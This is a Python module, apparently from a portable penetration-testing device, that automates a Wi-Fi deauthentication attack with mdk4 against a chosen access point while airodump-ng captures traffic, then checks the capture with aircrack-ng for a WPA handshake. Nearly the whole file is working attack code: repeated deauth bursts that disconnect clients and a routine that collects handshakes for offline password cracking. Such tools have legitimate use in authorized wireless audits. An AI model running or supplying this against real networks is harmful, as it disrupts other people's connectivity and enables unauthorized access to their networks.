# /opt/beetle/tools/wifi/mdk4_runner.py
# mdk4_runner.py

import subprocess
import time
import os
import signal
import atexit
import sys
from display.screen import MenuDisplay

# --- Configuración / constantes ---
IFACE = "mon0"
MON_UP_CMD = ["sudo", "mon0up"]
MON_DOWN_CMD = ["sudo", "mon0down"]

_child_procs = []  # procesos hijos registrados para limpieza
_cleanup_done = False

def _run_mon_cmd(cmd, timeout=4.0):
  
    try:
        p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=timeout)
        return p.returncode, (p.stdout or ""), (p.stderr or "")
    except Exception as e:
        return -1, "", str(e)

def _iface_exists():
    """Comprueba rápidamente si /sys/class/net/mon0 existe."""
    return os.path.isdir(f"/sys/class/net/{IFACE}")

def _iface_is_up():
    
    try:
        res = subprocess.run(["ip", "-o", "link", "show", IFACE],
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=1.2)
        if res.returncode != 0:
            return False
        out = (res.stdout or "") + (res.stderr or "")
        out = out.lower()
        return ("state up" in out) or ("<up" in out)
    except Exception:
        return False

def start_mon0(wait_seconds: float = 3.0) -> bool:
   
    attempts = 2
    for attempt in range(attempts):
        rc, out, err = _run_mon_cmd(MON_UP_CMD)
        combined = (out or "") + (err or "")
        # Si el comando devolvió error conocido no lo tratamos como fatal a priori:
        if rc != 0:
            if "operation not supported" in combined.lower() or "operation not supported (-95)" in combined.lower():
                # no fatal — el kernel/driver a veces muestra esto pero crea la interfaz inmediatamente
                pass
            # otros errores se ignoran temporalmente y comprobamos por sysfs/ip
        # esperar hasta que aparezca la interfaz
        deadline = time.time() + wait_seconds
        while time.time() < deadline:
            if _iface_exists() or _iface_is_up():
                return True
            time.sleep(0.15)
        # si no apareció, reintenta (hasta attempts)
    # comprobación final
    return _iface_exists() or _iface_is_up()

def stop_mon0() -> bool:
    
    rc, out, err = _run_mon_cmd(MON_DOWN_CMD)
    combined = ((out or "") + (err or "")).lower()
    if "device \"mon0\" does not exist" in combined or "no such device" in combined:
        return True
    # Breve espera para que kernel actualice estado
    time.sleep(0.25)
    if not _iface_exists() and not _iface_is_up():
        return True
    # Devolvemos True igualmente (el usuario pidió que siempre se ejecute mon0down), pero devolvemos False si sigue existiendo
    return not (_iface_exists() or _iface_is_up())

def _register_proc(p: subprocess.Popen):
    """Registra proceso hijo para futura limpieza."""
    if not p:
        return
    try:
        _child_procs.append(p)
    except Exception:
        pass

def _terminate_child_procs(timeout=3):
    """Termina todos los procesos hijos registrados de forma ordenada."""
    global _child_procs
    for p in list(_child_procs):
        try:
            if p.poll() is None:
                try:
                    p.terminate()
                    p.wait(timeout=timeout)
                except Exception:
                    try:
                        p.kill()
                    except Exception:
                        pass
        except Exception:
            pass
    _child_procs = []

def _cleanup():
    """Función de limpieza: termina procesos y baja mon0."""
    global _cleanup_done
    if _cleanup_done:
        return
    _cleanup_done = True
    try:
        _terminate_child_procs()
    except Exception:
        pass
    try:
        stop_mon0()
    except Exception:
        pass

# Registrar cleanup en salida normal
atexit.register(_cleanup)

def _signal_handler(signum, frame):
    """Manejador de señales para asegurar limpieza en SIGINT/SIGTERM."""
    _cleanup()
    # salir con código 128 + signo
    code = 128 + signum if isinstance(signum, int) else 1
    try:
        sys.exit(code)
    except SystemExit:
        os._exit(code)

signal.signal(signal.SIGINT, _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)

# ------------------ Función principal ------------------

def run_mdk4(ssid, bssid, channel):
    """
    Ejecuta MDK4 para deauth y airodump-ng para capturar handshake.
    Guarda log y archivo .cap en reports/wifi y verifica si se capturó handshake.
    """
    display = MenuDisplay()
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    folder = os.path.abspath(os.path.join(os.path.dirname(__file__), "/opt/beetle/reports/wifi"))
    os.makedirs(folder, exist_ok=True)

    safe_ssid = "".join(c for c in ssid if c.isalnum() or c in ('-_'))
    mdk4_log = os.path.join(folder, f"mdk4_{safe_ssid}_{timestamp}.log")
    cap_file = os.path.join(folder, f"handshake_{safe_ssid}_{timestamp}.cap")

    # Mostrar inicio
    display.show_message([f"MDK4 + Airodump", f"SSID: {ssid}", "Iniciando..."], center=True)
    time.sleep(1)

    # Asegurar que mon0 esté arriba (siempre usar sudo mon0up)
    ok = start_mon0(wait_seconds=3.0)
    if not ok:
        display.show_message(["No se pudo levantar", "mon0"], center=True)
        time.sleep(2)
        # cleanup (stop_mon0 se ejecuta en _cleanup)
        _cleanup()
        return None

    # Comando MDK4 (uso explícito de mon0)
    mdk4_cmd = [
        "sudo", "mdk4",
        IFACE,
        "d",
        "-c", str(channel),
        "-B", bssid
    ]

    # Comando Airodump-ng (escribe con prefijo sin .cap en -w)
    airodump_cmd = [
        "sudo", "airodump-ng",
        "-c", str(channel),
        "--bssid", bssid,
        "-w", cap_file.replace(".cap", ""),  # sin extensión
        IFACE
    ]

    # Inicia airodump-ng primero y registrar el proceso
    try:
        airodump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, text=True)
        _register_proc(airodump_proc)
    except Exception:
        display.show_message(["Error iniciando", "airodump-ng"], center=True)
        _cleanup()
        return None

    # Luego MDK4, haciendo ráfagas de deauth con pausas (mantengo la lógica original)
    try:
        with open(mdk4_log, "w") as log:
            num_deauth = 10       # cantidad de ráfagas
            deauth_duration = 2   # segundos por ráfaga 
            for i in range(num_deauth):
                try:
                    mdk4_proc = subprocess.Popen(mdk4_cmd, stdout=log, stderr=subprocess.STDOUT, text=True)
                    _register_proc(mdk4_proc)
                except Exception:
                    # si no se pudo lanzar mdk4, seguimos con siguiente iteración
                    mdk4_proc = None

                start = time.time()
                # esperar hasta que termine o expire la duración
                while mdk4_proc and mdk4_proc.poll() is None:
                    if time.time() - start > deauth_duration:
                        try:
                            mdk4_proc.terminate()
                        except Exception:
                            try:
                                mdk4_proc.kill()
                            except Exception:
                                pass
                        break
                    time.sleep(0.25)
                # pequeña pausa para permitir reconexión
                time.sleep(2)
    except Exception:
        # cualquier excepción durante MDK4 -> intentar limpieza controlada
        display.show_message(["Error ejecutando", "mdk4"], center=True)
        time.sleep(1)
    finally:
        # Asegurar que no queden procesos mdk4 vivos
        _terminate_child_procs()

    # Espera 10 segundos más para asegurar captura de paquetes tras MDK4 (original)
    time.sleep(10)

    # Terminar airodump-ng de forma ordenada
    try:
        if airodump_proc and airodump_proc.poll() is None:
            airodump_proc.terminate()
            try:
                airodump_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                try:
                    airodump_proc.kill()
                except Exception:
                    pass
    except Exception:
        pass

    # Verifica el tamaño del archivo .cap
    cap_ok = os.path.isfile(cap_file) and os.path.getsize(cap_file) > 10000

    # Verifica con aircrack-ng si hay handshake
    has_handshake = False
    if cap_ok:
        verify_cmd = ["aircrack-ng", cap_file]
        try:
            result = subprocess.run(verify_cmd, capture_output=True, text=True, timeout=10)
            has_handshake = "handshake" in (result.stdout or "").lower()
        except Exception:
            display.show_message(["Error al verificar", "con aircrack-ng"], center=True)
            time.sleep(2)

 
    if has_handshake:
        display.show_message(["Handshake capturado", "correctamente"], center=True)
    elif cap_ok:
        display.show_message(["Archivo .cap generado", "pero sin handshake"], center=True)
    else:
        display.show_message(["Error: .cap no válido", "Archivo vacío o corrupto"], center=True)

    time.sleep(3)

    
    try:
        _terminate_child_procs()
    except Exception:
        pass
    try:
        stop_mon0()
    except Exception:
        pass

    return cap_file if os.path.isfile(cap_file) else None

# Si se ejecuta directamente para pruebas rápidas
if __name__ == "__main__":
    print("Uso: importar run_mdk4(ssid, bssid, channel) desde otro script.")

